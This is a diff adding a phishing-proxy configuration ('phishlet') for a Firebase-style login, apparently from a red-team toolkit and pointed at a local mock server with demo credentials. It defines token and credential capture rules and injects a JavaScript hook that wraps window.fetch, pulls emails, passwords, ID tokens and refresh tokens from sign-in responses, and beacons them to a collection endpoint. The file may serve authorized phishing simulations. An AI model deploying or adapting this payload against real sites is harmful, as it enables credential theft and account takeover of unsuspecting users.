@@ -1,0 +1,140 @@
+# =============================================================================
+# demo-firebase — Firebase-shaped dry-run against demos/firebase
+# =============================================================================
+#
+# Upstream mock:  http://127.0.0.1:9081  (make demo-firebase)
+# Dry-run domain: demo-firebase.local.phishkit
+#
+# The mock serves Identity Toolkit-ish paths on the same origin:
+#   POST /identitytoolkit.googleapis.com/v1/accounts:signInWithPassword
+#   POST /api/token  (flat id_token / refresh_token helpers)
+#
+# Test creds: demo@phishkit.local / demo-password
+# Fake API key: AIzaSyDemoPhishkitFirebaseKey0000001
+#
+# Desktop restore/replay looks for id_token + refresh_token on the capture.
+# =============================================================================
+
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'demo-firebase.local.phishkit', session: true, is_landing: true, auto_filter: true}
+
+auth_tokens:
+  # Firebase Auth is token-in-body / client storage — cookies stay optional.
+  - domain: '.demo-firebase.local.phishkit'
+    keys:
+      - 'session,opt'
+      - 'access_token,opt'
+      - 'token,opt'
+
+  - domain: 'demo-firebase.local.phishkit'
+    type: 'body'
+    path: '/identitytoolkit.googleapis.com/v1/accounts:signInWithPassword'
+    name: 'id_token'
+    search: '"idToken"\s*:\s*"([^"]+)"'
+
+  - domain: 'demo-firebase.local.phishkit'
+    type: 'body'
+    path: '/api/token'
+    name: 'id_token'
+    search: '"id_token"\s*:\s*"([^"]+)"'
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'id_token'
+      search: '(.*)'
+      type: 'post'
+    - key: 'refresh_token'
+      search: '(.*)'
+      type: 'post'
+    - key: 'local_id'
+      search: '(.*)'
+      type: 'post'
+    - key: 'expires_in'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: 'demo-firebase.local.phishkit'
+  path: '/login'
+
+js_inject:
+  - id: 'firebase_token_exfil'
+    trigger_domains:
+      - 'demo-firebase.local.phishkit'
+    trigger_paths:
+      - '.*'
+    trigger_params: []
+    script: |
+      (function () {
+        if (window.__phishkit_firebase_hooked) return;
+        window.__phishkit_firebase_hooked = true;
+        var exfilUrl = window.location.origin + '/__evilginx_creds';
+
+        function exfil(payload) {
+          try {
+            var body = new URLSearchParams();
+            if (payload.email) body.set('email', payload.email);
+            if (payload.username) body.set('username', payload.username);
+            if (payload.password) body.set('password', payload.password);
+            if (payload.id_token) body.set('id_token', payload.id_token);
+            if (payload.refresh_token) body.set('refresh_token', payload.refresh_token);
+            if (payload.local_id) body.set('local_id', payload.local_id);
+            if (payload.expires_in) body.set('expires_in', String(payload.expires_in));
+            navigator.sendBeacon(exfilUrl, body);
+          } catch (e) {}
+        }
+
+        function fromAuthResponse(data, email, password) {
+          if (!data) return;
+          var idToken = data.idToken || data.id_token || (data.stsTokenManager && data.stsTokenManager.accessToken);
+          var refresh = data.refreshToken || data.refresh_token || (data.stsTokenManager && data.stsTokenManager.refreshToken);
+          if (!idToken && !refresh) return;
+          exfil({
+            email: email || data.email || '',
+            username: email || data.email || '',
+            password: password || '',
+            id_token: idToken || '',
+            refresh_token: refresh || '',
+            local_id: data.localId || data.local_id || data.uid || '',
+            expires_in: data.expiresIn || data.expires_in || ''
+          });
+        }
+
+        var origFetch = window.fetch;
+        window.fetch = function () {
+          var args = arguments;
+          var input = args[0];
+          var init = args[1] || {};
+          var url = (typeof input === 'string') ? input : (input && input.url) || '';
+          var reqBody = init.body;
+          return origFetch.apply(this, args).then(function (res) {
+            try {
+              if (url.indexOf('signInWithPassword') !== -1 || url.indexOf('/api/token') !== -1) {
+                var clone = res.clone();
+                clone.json().then(function (data) {
+                  var email = '', password = '';
+                  try {
+                    var parsed = (typeof reqBody === 'string') ? JSON.parse(reqBody) : {};
+                    email = parsed.email || parsed.username || '';
+                    password = parsed.password || '';
+                  } catch (e) {}
+                  fromAuthResponse(data, email, password);
+                }).catch(function () {});
+              }
+            } catch (e) {}
+            return res;
+          });
+        };
+
+        console.log('[evilginx] firebase auth hooks installed -> exfil to ' + exfilUrl);
+      })();
